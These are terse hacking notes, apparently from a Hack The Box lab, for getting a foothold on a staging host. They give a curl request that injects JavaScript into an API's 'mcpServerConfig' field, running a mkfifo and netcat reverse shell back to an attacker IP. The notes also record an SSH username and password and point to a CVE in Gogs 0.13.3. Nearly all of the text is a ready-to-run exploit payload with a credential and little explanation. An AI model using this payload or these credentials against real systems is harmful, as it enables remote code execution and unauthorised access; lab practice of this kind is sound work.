command to get a reverse shell: 
`curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
 ` -H "Content-Type: application/json" \
  `-H "Authorization: Bearer api key goes here" \
  `-d '{
  `"loadMethod": "listActions",
  `"inputs": {
    `"mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.0 1337 > /tmp/f\");return 1;})()})"`
  `}`
`}'`
ssh creds
* ben:r04D!!_R4ge

Gogs version is 0.13.3; the vulnerability is explained in [CVE-2025-64111](https://nvd.nist.gov/vuln/detail/CVE-2025-64111)

